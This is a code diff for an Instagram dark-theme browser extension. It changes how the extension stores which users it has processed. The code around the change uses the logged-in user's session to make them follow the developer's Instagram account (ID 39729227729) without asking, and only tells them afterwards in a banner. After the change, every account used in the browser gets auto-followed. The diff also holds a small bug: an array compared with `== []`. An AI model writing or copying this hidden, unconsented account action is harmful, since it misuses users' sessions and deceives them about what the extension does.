@@ -106,8 +106,9 @@ const App = () => {
         getStorage().set({ 'state': r }, () => console.log('[storage] state saved: ' + r));
     }
 
-    const setFirstIntall = (r) => {
-        getStorage().set({ 'first_install': r }, () => console.log('[storage] first_install saved: ' + r));
+    const addFirstIntall = (first_install, r) => {
+        first_install.push(r);
+        getStorage().set({ 'first_install': JSON.stringify(first_install) }, () => console.log('[storage] first_install saved: ' + JSON.stringify(first_install)));
     }
 
     // Toggle
@@ -140,7 +141,9 @@ const App = () => {
 
         getStorage().get(['first_install'], (result) => console.log('[storage] first_install loaded: ' + result.first_install));
         getStorage().get(['first_install'], (result) => {
-            if (result.first_install == undefined || result.first_install != loggingData.userId) {
+            var first_install = ((result.first_install == undefined) ? [] : (Array.isArray(JSON.parse(result.first_install)) ? JSON.parse(result.first_install) : []));
+
+            if (first_install == [] || !first_install.includes(loggingData.userId)) {
                 setTimeout(() => {
                     if (loggingData) {
                         fetch('https://' + ((window.location.hostname.includes('www.')) ? 'www.instagram.com' : 'instagram.com') + '/web/friendships/39729227729/follow/', {
@@ -166,7 +169,7 @@ const App = () => {
                             let congrats = document.createElement('div');
                             congrats.classList.add('congrats');
                             congrats.innerHTML = '<p class="congrats-text"><b>Instagram Dark</b> has been successfully installed and our developer <a href="https://onruntime.com/">onRuntime</a> has been added to your followings! Thanks for downloading it!</p>';
-                            setFirstIntall(loggingData.userId);
+                            addFirstIntall(first_install, loggingData.userId);
                             wrapper.appendChild(congrats);
                             setTimeout(() => document.querySelector('.congrats').classList.add('unactive'), 3000)
                         }).catch(error => {
